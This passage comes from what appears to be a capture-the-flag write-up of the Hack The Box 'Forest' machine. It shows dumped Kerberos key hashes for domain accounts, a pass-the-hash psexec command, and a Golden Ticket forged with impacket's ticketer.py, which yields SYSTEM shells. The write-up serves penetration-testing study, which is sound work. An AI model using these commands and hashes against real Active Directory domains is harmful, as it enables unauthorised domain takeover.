htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
amirr0r:aes256-cts-hmac-sha1-96:1bcb06ac63d36244df3f5e5caf71124272fb4f3a39a92f7388e0dae5c6a1e994
amirr0r:aes128-cts-hmac-sha1-96:4579d5cfdce40a61edd38e611ecb54a4
amirr0r:des-cbc-md5:942f64df5b4f68c4
FOREST$:aes256-cts-hmac-sha1-96:436bb9ae0cf5796398fafe5ff9bdff2ad2d9159151a3da186753c95c708ffd9f
FOREST$:aes128-cts-hmac-sha1-96:51ff1311236394aa15091e4b7029f142
FOREST$:des-cbc-md5:e0c43de6544f5e83
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up..
```

### Pass The Hash

We can use **PsExec** with `Administrator` hashes to gain access:

```bash
$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

![](/assets/img/htb/machines/windows/easy/forest/system.png)

Now that we're **SYSTEM** on the target machine, we could stop here... 😎

___

## Going further with Golden Ticket... (without `mimikatz`)

An additional thing that we can do to have fun is performing a **Golden Ticket** attack using the `KRBTGT` hash we retrieved.

1) First we need to grab the Domain SID (Security IDentifier):

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Get-ADDomain htb.local


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=htb,DC=local
DeletedObjectsContainer            : CN=Deleted Objects,DC=htb,DC=local
DistinguishedName                  : DC=htb,DC=local
DNSRoot                            : htb.local
DomainControllersContainer         : OU=Domain Controllers,DC=htb,DC=local
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3072663084-364016917-1341370565
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=htb,DC=local
Forest                             : htb.local
InfrastructureMaster               : FOREST.htb.local
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=local}
LostAndFoundContainer              : CN=LostAndFound,DC=htb,DC=local
ManagedBy                          :
Name                               : htb
NetBIOSName                        : HTB
ObjectClass                        : domainDNS
ObjectGUID                         : dff0c71a-a949-4b26-8c7b-52e3e2cb6eab
ParentDomain                       :
PDCEmulator                        : FOREST.htb.local
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=htb,DC=local
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {FOREST.htb.local}
RIDMaster                          : FOREST.htb.local
SubordinateReferences              : {DC=ForestDnsZones,DC=htb,DC=local, DC=DomainDnsZones,DC=htb,DC=local, CN=Configuration,DC=htb,DC=local}
SystemsContainer                   : CN=System,DC=htb,DC=local
UsersContainer                     : CN=Users,DC=htb,DC=local
```

2) Now that we have the Domain SID (`S-1-5-21-3072663084-364016917-1341370565`), we can use `ticketer.py` from **impacket** to generate a TGT with the `krbtgt` password Hash for a user who does not exist:

```bash
# python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
$ ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local doesnotexist
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for htb.local/doesnotexist
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in doesnotexist.ccache
$ export KRB5CCNAME=doesnotexist.ccache
# python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ psexec.py htb.local/amirr0r@$TARGET -k -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

This error indicates that we have to synchronise our localtime with the DC clock. We can use `ntpdate` to solve this issue.

```bash
$ ntpdate $TARGET
 6 Sep 18:04:19 ntpdate[6024]: step time server 10.10.10.161 offset +611.916121 sec
```

I also added `forest` to the `/etc/hosts` file :

```
10.10.10.161  htb.local forest
```

Then it worked:

```bash
$ psexec.py htb.local/doesnotexist@forest -k -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on forest.....
[*] Found writable share ADMIN$
[*] Uploading file lItXNAXI.exe
[*] Opening SVCManager on forest.....
[*] Creating service bnPS on forest.....
[*] Starting service bnPS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on forest.....
[*] Stopping service bnPS.....
[*] Removing service bnPS.....
[*] Removing file lItXNAXI.exe.....

# smbexec also works
smbexec.py htb.local/doesnotexist@forest -k -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

___

## Useful links

- [Alfresco documentation](https://docs.alfresco.com/process-services/latest/config/authenticate/)
- [What is AS-REP Roasting attack, really?](https://thehackernews.com/2021/09/what-is-as-rep-roasting-attack-really.html)
- [The hacker recipes](https://www.thehacker.recipes/)
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound#about-bloodhound)
- [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe)
- [Microsoft documentation - Account Operators group](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators)
- [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [VbScrub - Kerberos Golden Ticket Attack Explained](https://youtu.be/o98_eRt777Y)
- [Well known SIDS](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids)
- [Kerberos attacks cheatsheet (Golden Ticket from Linux)](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#golden-ticket)
